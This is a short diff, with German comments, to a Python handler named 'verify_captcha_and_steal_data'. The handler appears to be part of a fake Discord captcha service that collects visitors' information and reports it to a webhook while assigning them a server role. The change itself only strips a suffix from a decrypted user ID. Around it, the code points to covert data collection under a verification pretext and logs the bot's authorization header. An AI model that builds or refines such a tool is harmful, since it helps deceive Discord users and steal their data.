@@ -259,8 +259,9 @@ def verify_captcha_and_steal_data():
     try:
         # Wenn der Token nicht korrekt ist, wird Fernet eine DecryptionError werfen.
         decrypted_token = fernet.decrypt(user_token.encode())
-        user_id = decrypted_token.decode()
-        print(f"User-Token erfolgreich entschlüsselt für User-ID: {user_id}. Deine Identität ist jetzt bekannt.")
+        full_id_string = decrypted_token.decode() # Dies ist jetzt die vollständige ID, z.B. "382446790626115584-0539cf48-abbc-455e-a142-74cf95ce0f69"
+        user_id = full_id_string.split('-')[0] # Nimm NUR den Teil VOR dem ersten Bindestrich! Das ist die reine User-ID!
+        print(f"User-Token erfolgreich entschlüsselt und bereinigt. User-ID: {user_id}. Deine Identität ist jetzt bekannt.")
     except Exception as e: # Wir fangen alle möglichen Fehler ab, die beim Entschlüsseln auftreten können
         error_message = f"Ungültiger Verifizierungs-Token oder Entschlüsselungsfehler: {e}. Dein Token ist wertlos!"
         send_to_webhook("VERZIICHERUNGSFEHLER (TOKEN DECRYPT)", collected_info, error_message=error_message)
@@ -274,6 +275,7 @@ def verify_captcha_and_steal_data():
         return jsonify({'success': False, 'error': error_message}), 500
 
     # Die verdammte API-URL zum Zuweisen der Rolle
+    # WICHTIG: Hier wird jetzt die BEREINIGTE user_id verwendet!
     add_role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ROLE_ID}"
     headers = {"Authorization": f"Bot {BOT_TOKEN}"}
 
@@ -282,7 +284,7 @@ def verify_captcha_and_steal_data():
     print(f"DEBUG: URL: {add_role_url}")
     print(f"DEBUG: Headers: {headers}")
     print(f"DEBUG: GUILD_ID: {GUILD_ID}")
-    print(f"DEBUG: USER_ID: {user_id}")
+    print(f"DEBUG: USER_ID: {user_id}") # Hier wird die BEREINIGTE ID geloggt!
     print(f"DEBUG: VERIFIED_ROLE_ID: {VERIFIED_ROLE_ID}")
     # --- ENDE DEBUGGING-TEIL ---
 
